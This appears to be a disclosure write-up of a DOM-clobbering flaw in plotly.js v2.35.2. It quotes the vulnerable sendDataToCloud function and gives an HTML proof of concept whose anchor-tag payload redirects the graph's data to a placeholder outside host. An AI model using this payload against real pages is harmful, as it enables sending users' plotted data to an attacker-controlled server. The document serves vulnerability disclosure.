## plotly.js

### Meta

+ Library: plotly.js
+ Stars: 16.9K
+ Version: v2.35.2
+ Fingerprint: `window.PLOTLYENV  !== undefined`
+ Payload: ```<a id="PLOTLYENV"></a><a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>```
+ Impact: CSRF
+ CVE: N/A
+ Status: Reported
+ Security Policy: Email
+ Foundby: TheHulk

### Library

https://github.com/plotly/plotly.js

### Vulnerable Code Snippet

```javascript
plots.sendDataToCloud = function(gd) {
    var baseUrl = (window.PLOTLYENV || {}).BASE_URL || gd._context.plotlyServerURL;
    if(!baseUrl) return;

    gd.emit('plotly_beforeexport');

    var hiddenformDiv = d3.select(gd)
        .append('div')
        .attr('id', 'hiddenform')
        .style('display', 'none');

    var hiddenform = hiddenformDiv
        .append('form')
        .attr({
            action: baseUrl + '/external',
            method: 'post',
            target: '_blank'
        });

    var hiddenformInput = hiddenform
        .append('input')
        .attr({
            type: 'text',
            name: 'data'
        });

    hiddenformInput.node().value = plots.graphJson(gd, false, 'keepdata');
    hiddenform.node().submit();
    hiddenformDiv.remove();

    gd.emit('plotly_afterexport');
    return false;
};
```

## PoC

```html
<!--Library-->
<div id="gd"></div>
<script src="https://cdn.plot.ly/plotly-2.35.2.min.js" charset="utf-8"></script>
<script>
    Plotly.newPlot("gd", /* JSON object */ {
        "data": [{ "y": [1, 2, 3] }],
        "layout": { "width": 600, "height": 400}
    })
    Plotly.Plots.sendDataToCloud(gd);
</script>
<!--Library-->

<!--Payload-->
<a id="PLOTLYENV" href="https://xxx.xxx.xxx/?a="></a>
<a id="PLOTLYENV" name="BASE_URL" href="https://xxx.xxx.xxx/?a="></a>
<!--Payload-->
```